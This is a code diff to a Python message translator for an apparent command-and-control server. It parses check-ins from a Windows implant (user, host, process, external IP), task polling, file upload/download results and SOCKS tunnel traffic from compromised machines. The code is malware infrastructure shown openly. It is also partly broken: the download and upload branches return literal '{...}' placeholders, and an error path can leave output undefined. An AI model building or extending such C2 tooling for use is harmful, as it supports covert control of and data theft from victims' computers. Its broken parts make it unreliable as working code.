@@ -9,11 +9,15 @@ def CheckinC2( Data ) -> dict:
 
     OsName = "Windows";
     OsArch = Psr.Pad( 1 );
+    OscArc = ""
+
+    if isinstance(OsArch, bytes):
+        OsArch = int.from_bytes(OsArch, byteorder='big', signed=False)
 
     if OsArch == 0x64:
-        OsArch = "x64";
+        OscArc = "x64";
     elif OsArch == 0x86:
-        OsArch = "0x86";
+        OscArc = "0x86";
 
     UserName  = Psr.Str();
     HostName  = Psr.Str();
@@ -34,102 +38,99 @@ def CheckinC2( Data ) -> dict:
         "process_name":ImagePath,
         "pid": ProcessID,
         "uuid": UUID.decode('cp850'),
-        "architecture": OsArch.decode('cp850'),
+        "architecture": OscArc,
         "externalIP": ExternIp,
     };
 
-    GetChkDbg( f"checkin json: {JsonData}" );
+    GetChkDbg( f"checkin json: {JsonData} arch {OsArch}" );
 
     return JsonData;
 
 def GetTaskingC2( Data ):
     GetTaskDbg( "------------------------" );
 
-    numTasks = int.from_bytes( Data[0:4] );
-    JsonData = { "action": "get_tasking", "tasking_size": numTasks };
+    JsonData = { "action": "get_tasking", "tasking_size": -1 };
 
-    GetTaskDbg( f"quantity: {numTasks}" );
+    GetTaskDbg( f"getting all tasks" );
 
     GetTaskDbg( "------------------------" );
 
     return JsonData
 
-def PostC2( Data ):
+def PostC2(Data):
+    RespPostDbg("------------------------")
+    RespTsk = [] 
+    RespSck = []
 
-    RespPostDbg( "------------------------" );
+    Psr = Parser(Data, len(Data))
+    Tasks = Psr.Int32()
+    RespPostDbg(f"Task quantity: {Tasks}")
 
-    RespTsk = [];
-
-    RespPostDbg( f"Raw Data: [{len(Data)} bytes] {Data}" );
-
-    Psr = Parser( Data, len( Data ) );
-    
-    TaskUUID = Psr.Bytes().replace(b'\x00', b'')
-    try:
-        TaskUUID = TaskUUID.decode('utf-8')
-    except UnicodeDecodeError:
-        TaskUUID = TaskUUID.hex() 
-    
-    CommandID = Psr.Pad( 2 );
-    CommandID = int.from_bytes( CommandID, byteorder="big" );
-
-    Output   = "";
-    RawBytes = b'';
-    
-    if CommandID == T_DOWNLOAD:
-        JsonTsk = {
-            "task_id": TaskUUID,  
-            "download": {
-                "chunk_num": 0,
-                "file_id": 0,
-                "chunk_data": 0,
-                "chunk_size": 0
-           }
-        };
+    for Task in range(Tasks):
+        TaskLength = Psr.Int32()
+        TaskData = Psr.Pad(TaskLength)
+        TaskPsr = Parser(TaskData, TaskLength)
         
-    elif CommandID == T_UPLOAD:
-        CurChunk  = Psr.Int32();
-        FileID    = Psr.Str();
-        Path      = Psr.Str();
-        ChunkSize = Psr.Int32();
-
-        JsonTsk = {
-            "task_id": TaskUUID,
-            "upload": {
-                "chunk_num": CurChunk,
-                "file_id": FileID,
-                "full_path": Path,
-                "chunk_size": ChunkSize
-            }
-        };
-
-    else:
-
+        TaskUUID = TaskPsr.Bytes().replace(b'\x00', b'')
         try:
-            RawBytes = Psr.All();
-            Output   = RawBytes.hex();
-        except Exception as e:
-            RespPostDbg( f"failed get raw argument from agent: {e}" );\
+            TaskUUID = TaskUUID.decode('utf-8')
+        except UnicodeDecodeError:
+            TaskUUID = TaskUUID.hex()
+        
+        CommandID = TaskPsr.Pad(2)
+        CommandID = int.from_bytes(CommandID, byteorder="big")
+
+        if CommandID == T_SOCKS:
+            Ext = TaskPsr.Int32()
+            Srv = TaskPsr.Int32()
             
-        JsonTsk = {
-            "task_id": TaskUUID,  
-            "process_response": Output,
-            "completed": True
-        };
+            if TaskPsr.buffer is not None:
+                Data = TaskPsr.Bytes()
+                Data = base64.b64encode( Data ).decode( "utf-8" )
+            else:
+                Data = ""
+            
+            SocksData = {
+                "exit": bool(Ext),
+                "server_id": Srv,
+                "data": Data 
+            }
+            RespSck.append(SocksData)
+        else:
+            JsonTsk = process_normal_task(TaskUUID, CommandID, TaskPsr)
+            RespTsk.append(JsonTsk)
 
-    RespPostDbg( f"command id : {CommandID}" );
-    RespPostDbg( f"task uuid  : {TaskUUID}" );
-
-    RespTsk.append( JsonTsk );
-    
     JsonData = {
         "action": "post_response",
-        "responses": RespTsk
-    };
+        "responses": RespTsk,
+    }
 
-    RespPostDbg( f"json data: {JsonData}" );
-    RespPostDbg( f"json task: {JsonTsk}"  );
+    if RespSck:
+        JsonData["socks"] = RespSck
 
-    RespPostDbg( "------------------------" );
+    RespPostDbg(f"JSON data: {JsonData}")
+    RespPostDbg("------------------------")
+    return JsonData
 
-    return JsonData;
+def process_normal_task(TaskUUID, CommandID, TaskPsr):
+    if CommandID == T_DOWNLOAD:
+        return {"task_id": TaskUUID, "download": {...}}
+    elif CommandID == T_UPLOAD:
+        return {"task_id": TaskUUID, "upload": {...}}
+    elif CommandID == JOB_ERROR:
+        ErrorCode = TaskPsr.Int32()
+        ErrorMsg  = TaskPsr.Bytes().decode("utf-8")  
+
+        if ErrorCode < 0:
+            hex_code = f"{ErrorCode & 0xFFFFFFFF:X}" 
+            Output   = f"({hex_code}) {ErrorMsg}"
+        else:
+            Output = f"({ErrorCode}) {ErrorMsg}"
+        return {"task_id": TaskUUID, "user_output": Output, "completed": True}
+    else:
+        try:
+            RawBytes = TaskPsr.All()
+            Output   = RawBytes.hex()
+        except Exception as e:
+            RespPostDbg( f"failed get raw argument from agent: {e}" )
+        return {"task_id": TaskUUID, "process_response": Output, "completed": True}
